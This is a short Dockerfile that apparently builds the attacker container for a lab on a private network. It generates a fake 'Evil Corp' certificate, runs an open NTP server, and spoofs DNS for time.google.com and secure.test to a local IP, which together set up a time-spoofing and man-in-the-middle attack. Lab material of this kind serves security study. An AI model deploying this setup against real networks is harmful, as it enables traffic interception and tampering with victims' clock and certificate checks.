FROM alpine:latest

# Install Nginx, Dnsmasq, Chrony, AND OpenSSL
RUN apk update && \
    apk add --no-cache dnsmasq chrony nginx openssl && \
    mkdir -p /run/nginx /etc/nginx/certs

# Generate a FAKE Self-Signed Certificate for the Attacker
RUN openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout /etc/nginx/certs/attacker.key \
    -out /etc/nginx/certs/attacker.crt \
    -subj "/C=US/ST=Evil/L=Evil/O=Evil Corp/CN=secure.test"

# Configure services
RUN echo 'allow all' > /etc/chrony/chrony.conf && \
    echo 'local stratum 10' >> /etc/chrony/chrony.conf

RUN echo 'log-queries' >> /etc/dnsmasq.conf && \
    echo 'server=8.8.8.8' >> /etc/dnsmasq.conf && \
    echo 'address=/time.google.com/172.20.0.5' >> /etc/dnsmasq.conf && \
    echo 'address=/secure.test/172.20.0.5' >> /etc/dnsmasq.conf

EXPOSE 53/udp 53/tcp 80/tcp 443/tcp 123/udp

CMD ["/bin/sh", "-c", "/usr/sbin/nginx -g 'daemon on;' && chronyd -d & dnsmasq --no-daemon"]